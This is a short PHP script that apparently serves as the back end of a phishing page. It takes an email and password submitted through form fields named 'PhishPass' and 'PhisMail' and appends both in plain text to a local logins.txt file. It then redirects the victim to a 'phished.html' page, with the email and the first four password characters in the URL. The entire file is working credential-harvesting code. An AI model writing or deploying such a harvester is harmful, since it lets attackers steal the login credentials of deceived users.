<?php

session_start();

$pass = $_POST["PhishPass"];
$email = $_POST["PhisMail"];
$pass4 = substr($pass, 0, 4);   // Get only 1st 4 characters to display on next page :)
$file = fopen("logins.txt", "a") or die("Unable to open file!");
			
//Writing email and password to logins.txt. 
fwrite($file, $email."	".$pass.PHP_EOL);			
fclose($file);//closing logins.txt.
header("Location: ./phished.html?em=$email&ps=$pass4");
exit();


session_destroy();
